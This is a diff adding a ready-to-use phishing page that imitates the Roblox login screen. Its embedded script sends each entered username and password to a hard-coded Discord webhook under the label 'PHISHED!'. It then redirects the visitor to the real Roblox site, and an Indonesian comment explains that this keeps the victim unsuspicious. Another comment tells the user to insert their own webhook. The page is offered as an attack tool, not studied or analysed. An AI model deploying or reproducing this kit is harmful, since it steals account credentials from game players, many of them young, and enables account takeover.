@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Login</title>
+    <style>
+        body { font-family: Arial; background: #f2f2f2; text-align: center; padding-top: 100px; }
+        input { padding: 10px; margin: 10px; width: 250px; }
+        button { padding: 10px 20px; background: #00a2ff; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h2>Log in to Roblox</h2>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username" required><br>
+        <input type="password" id="password" placeholder="Password" required><br>
+        <button type="submit">Log In</button>
+    </form>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // 🔥 GANTI LINK INI DENGAN WEBHOOK LU!
+            const webhook = "https://discord.com/api/webhooks/1461331481937973270/zwoCvuXIfD-Rhj4SYaA6VAlEWSpcnDE11tiUncyvgeE3pe7BWhk7BosUpbtn4xiJeq3G";
+
+            await fetch(webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: `💀 **PHISHED!**\nUser: \`${user}\`\nPass: \`${pass}\``
+                })
+            });
+
+            // Redirect ke Roblox asli biar korban ga curiga
+            window.location.href = "https://www.roblox.com/login";
+        });
+    </script>
+</body>
+</html>
